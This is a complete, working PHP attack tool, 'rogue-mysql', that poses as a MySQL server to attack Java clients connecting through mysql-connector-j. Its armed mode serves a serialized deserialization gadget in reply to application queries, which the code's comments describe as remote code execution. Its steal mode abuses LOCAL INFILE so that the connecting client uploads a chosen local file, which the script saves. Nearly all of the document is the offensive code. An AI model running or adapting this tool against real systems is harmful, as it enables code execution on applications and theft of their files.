#!/usr/bin/env php
<?php
/* rogue-mysql — MySQL wire-protocol responder (PHP 8.3 CLI, zero deps)
 * Modes:
 *   php rogue_mysql.php --port 3306 --payload /dev/shm/gadget.bin --cb 172.28.0.30:9440
 *   php rogue_mysql.php --port 3306 --nice     (benign SHOW SESSION STATUS — service continuity)
 *
 * Behavior:
 *   - handshake: advertises mysql_native_password, accepts any creds
 *   - "SHOW SESSION STATUS" -> resultset whose first column is binary(VAR_STRING,charset63)
 *     containing the serialized gadget -> mysql-connector-j 8.0.33 with
 *     autoDeserialize=true + queryInterceptors=ServerStatusDiffInterceptor readObject()s it
 *   - SELECT @@...  init query -> resultset with N columns matching @@ count
 *   - SET ... -> OK ; other SELECT -> single col "1"
 */

$opt = getopt('', ['port:', 'payload:', 'nice', 'cb:', 'log:', 'steal:', 'stealout:']);
$PORT   = isset($opt['port']) ? (int)$opt['port'] : 3306;
$NICE   = isset($opt['nice']);
$PAY    = isset($opt['payload']) ? $opt['payload'] : '';
$CB     = isset($opt['cb']) ? $opt['cb'] : '';
$LOGF   = isset($opt['log']) ? $opt['log'] : '/dev/shm/rogue.log';
$STEAL  = isset($opt['steal']) ? $opt['steal'] : '';        // file path to exfiltrate
$STEALO = isset($opt['stealout']) ? $opt['stealout'] : '/dev/shm/stolen.bin';

function lg(string $m): void {
    global $LOGF;
    $line = date('H:i:s') . ' ' . $m . "\n";
    file_put_contents($LOGF, $line, FILE_APPEND);
    echo $line;
}

/* ---------- wire helpers ---------- */
function pkt(string $payload, int $seq): string {
    $len = strlen($payload);
    return substr(pack('V', $len), 0, 3) . chr($seq) . $payload;
}
function lenenc_int(int $n): string {
    if ($n < 251) return chr($n);
    if ($n < 65536) return "\xfc" . pack('v', $n);
    if ($n < 16777216) return "\xfd" . substr(pack('V', $n), 0, 3);
    return "\xfe" . pack('J', $n);
}
function lenenc_str(string $s): string { return lenenc_int(strlen($s)) . $s; }

function read_packet($fp, ?int &$seq): ?string {
    $hdr = fread($fp, 4);
    if ($hdr === false || strlen($hdr) < 4) return null;
    $len = ord($hdr[0]) | (ord($hdr[1]) << 8) | (ord($hdr[2]) << 16);
    $seq = ord($hdr[3]);
    $buf = '';
    while (strlen($buf) < $len) {
        $c = fread($fp, $len - strlen($buf));
        if ($c === false || $c === '') return null;
        $buf .= $c;
    }
    return $buf;
}

/* ---------- packets ---------- */
function greeting(): string {
    $salt1 = random_bytes(8);
    $salt2 = random_bytes(12);
    $caps_lo = 0xffff & ~0x0800;          // all minus CLIENT_SSL
    $caps_hi = 0x00ff;                    // no DEPRECATE_EOF (old-style EOF packets)
    return chr(0x0a)
        . "8.0.33\0"
        . pack('V', 1337)
        . $salt1 . "\0"
        . pack('v', $caps_lo)
        . chr(0x21)                        // charset
        . pack('v', 0x0002)                // autocommit
        . pack('v', $caps_hi)
        . chr(21)
        . str_repeat("\0", 10)
        . $salt2 . "\0"
        . "mysql_native_password\0";
}
function okpkt(): string { return "\x00\x00\x00\x02\x00\x00\x00"; }
function errpkt(string $msg, int $code = 1064): string {
    return "\xff" . pack('v', $code) . "#HY000 " . $msg;
}
function eofpkt(): string { return "\xfe\x00\x00\x02\x00"; }

function coldef(string $name, int $type = 0xfd, int $charset = 0x21, int $binflag = 0): string {
    return lenenc_str("def") . lenenc_str("") . lenenc_str("") . lenenc_str("")
        . lenenc_str($name) . lenenc_str("")
        . lenenc_int(12)
        . pack('v', $charset)
        . pack('V', 0xffffffff)
        . chr($type)
        . pack('v', 0x2001 | $binflag)   // NOT_NULL + BINARY if set
        . chr(0)
        . "\0\0";
}

/* generic textual resultset */
function text_resultset(array $cols, array $rows): array {
    $out = [];
    $out[] = lenenc_int(count($cols));
    foreach ($cols as $c) $out[] = coldef($c);
    $out[] = eofpkt();
    foreach ($rows as $r) {
        $row = '';
        foreach ($r as $v) $row .= lenenc_str((string)$v);
        $out[] = $row;
    }
    $out[] = eofpkt();
    return $out;
}

/* malicious resultset: first column binary blob carrying the payload */
function payload_resultset(string $blob): array {
    $out = [];
    $out[] = lenenc_int(2);
    $out[] = coldef("Variable_name", 0xfd, 0x21, 0);
    $out[] = coldef("Value", 0xfd, 63, 128);        // charset 63 = binary -> VARBINARY
    $out[] = eofpkt();
    $out[] = lenenc_str("x") . lenenc_str($blob);   // row: "x", <serialized gadget>
    $out[] = eofpkt();
    return $out;
}

/* map init-query aliases to sane values */
function init_value(string $alias): string {
    $map = [
        'character_set_client' => 'utf8mb4', 'character_set_connection' => 'utf8mb4',
        'character_set_results' => 'utf8mb4', 'character_set_server' => 'utf8mb4',
        'collation_server' => 'utf8mb4_0900_ai_ci', 'collation_connection' => 'utf8mb4_0900_ai_ci',
        'max_allowed_packet' => '1073741824', 'sql_mode' => 'ONLY_FULL_GROUP_BY,STRICT_TRANS_TABLES',
        'system_time_zone' => 'UTC', 'time_zone' => 'SYSTEM',
        'transaction_isolation' => 'READ-COMMITTED', 'license' => 'GPL',
        'transaction_read_only' => '0', 'tx_read_only' => '0',
        'autocommit' => '1', 'auto_increment_increment' => '1',
        'init_connect' => '', 'performance_schema' => '0',
    ];
    return $map[$alias] ?? '1';
}

/* derive a column name from a bare @@ token: @@SESSION.TRANSACTION_ISOLATION -> transaction_isolation */
function rogue_colname(string $token): string {
    $t = preg_replace('/^@@/i', '', $token);
    $t = explode('.', $t);
    return strtolower(end($t));
}

function respond_query(string $q): array {
    global $NICE, $PAY, $CB;
    $qt = strtoupper(trim(preg_replace('/\s+/', ' ', $q)));
    lg("Q: " . substr($qt, 0, 90));

    if (strpos($qt, 'SET ') === 0) return [okpkt()];

    // STEAL mode: reply to app-level SELECT with LOCAL INFILE request (0xFB) —
    // connector (allowLoadLocalInfile=true) uploads the named local file to us.
    global $STEAL;
    if ($STEAL !== '' && strpos($qt, 'SELECT') === 0 && strpos($qt, 'SELECT @@') !== 0) {
        return ["\xfb" . $STEAL];   // special piece — handled by server loop
    }

    // ARMED: app-level SELECTs (not SET/@@/SHOW) get the gadget blob.
    // Spring JdbcTemplate reads results via ResultSet.getObject() ->
    // connector autoDeserialize=true -> readObject(gadget) = RCE.
    if (!$NICE && $PAY !== '' && is_readable($PAY)
        && strpos($qt, 'SELECT') === 0
        && strpos($qt, 'SELECT @@') !== 0) {
        $blob = file_get_contents($PAY);
        lg(">> ARMED(app-query): serving gadget " . strlen($blob) . "B for [" . substr($qt, 0, 40) . "]");
        $out = [];
        $out[] = lenenc_int(1);
        $out[] = coldef("1", 0xfd, 63, 128);            // VARBINARY (charset 63 + BINARY)
        $out[] = eofpkt();
        $out[] = lenenc_str($blob);
        $out[] = eofpkt();
        return $out;
    }

    if (strpos($qt, 'SHOW SESSION STATUS') === 0 || strpos($qt, 'SHOW STATUS') === 0) {
        return text_resultset(['Variable_name', 'Value'],
            [['Aborted_clients', '0'], ['Bytes_sent', '42'], ['Uptime', '100']]);
    }
    if (strpos($qt, 'SHOW VARIABLES') === 0) {
        return text_resultset(['Variable_name', 'Value'],
            [['max_allowed_packet', '1073741824'], ['auto_increment_increment', '1'],
             ['character_set_client', 'utf8mb4'], ['system_time_zone', 'UTC']]);
    }
    if (strpos($qt, 'SELECT @@') === 0 || strpos($qt, '/*') === 0) {
        preg_match_all('/@@[a-z_.]+(?:\s+AS\s+([a-zA-Z_]+))?/i', $q, $m);
        $names = [];
        foreach ($m[0] as $i => $tok) {
            $names[] = ($m[1][$i] ?? '') !== '' ? $m[1][$i] : rogue_colname($tok);
        }
        if (!$names) $names = ['c0'];
        $row = array_map('init_value', $names);
        return text_resultset($names, [$row]);
    }
    if (strpos($qt, 'SHOW DATABASES') === 0) return text_resultset(['Database'], [['auxdb']]);
    if (strpos($qt, 'SELECT') === 0) return text_resultset(['1'], [['1']]);
    if (strpos($qt, 'KILL') === 0) return [okpkt()];
    return [errpkt("rogue: unhandled")];
}

/* ---------- server loop ---------- */
$srv = @stream_socket_server("tcp://0.0.0.0:$PORT", $errno, $errstr);
if (!$srv) { fwrite(STDERR, "listen fail: $errstr\n"); exit(1); }
lg("rogue-mysql listening :$PORT nice=" . ($NICE ? '1' : '0') . " payload=" . ($PAY ?: '-'));

while (true) {
    $cli = @stream_socket_accept($srv, 600);
    if ($cli === false) continue;   // idle timeout — keep serving
    stream_set_timeout($cli, 30);
    $peer = stream_socket_get_name($cli, true);
    lg("CONN from $peer");
    fwrite($cli, pkt(greeting(), 0));

    $seq = 0;
    $hs = read_packet($cli, $seq);            // handshake response (creds — ignored)
    if ($hs === null) { fclose($cli); continue; }
    fwrite($cli, pkt(okpkt(), $seq + 1));

    while (($p = read_packet($cli, $seq)) !== null) {
        $cmd = ord($p[0]);
        if ($cmd === 0x01) { lg("COM_QUIT"); break; }             // QUIT
        if ($cmd === 0x0e) { fwrite($cli, pkt("\x01", $seq + 1)); continue; } // PING -> OK-ish
        if ($cmd !== 0x03) { fwrite($cli, pkt(errpkt("cmd $cmd"), $seq + 1)); continue; }
        $q = substr($p, 1);
        $resp = respond_query($q);
        $s = $seq + 1;
        foreach ($resp as $piece) {
            if (substr($piece, 0, 1) === "\xfb") {
                // LOCAL INFILE handshake: send request, then drain file packets
                fwrite($cli, pkt($piece, $s)); $s = ($s + 1) & 0xff;
                global $STEALO;
                $fh = fopen($STEALO, 'wb');
                $got = 0; $pkts = 0; $seq2 = 0;
                while (true) {
                    $fp2 = read_packet($cli, $seq2);
                    if ($fp2 === null) break;
                    if (strlen($fp2) === 0) break;      // empty packet = transfer done
                    fwrite($fh, $fp2);
                    $got += strlen($fp2); $pkts++;
                    if ($pkts > 200000) break;          // 200k packets safety
                }
                fclose($fh);
                fwrite($cli, pkt(okpkt(), ($seq + 1) & 0xff));
                lg("STOLEN $got bytes ($pkts pkts) -> $STEALO");
                continue 2;   // nothing else to send for this query
            }
            fwrite($cli, pkt($piece, $s)); $s = ($s + 1) & 0xff;
        }
    }
    lg("CLOSE $peer");
    fclose($cli);
}
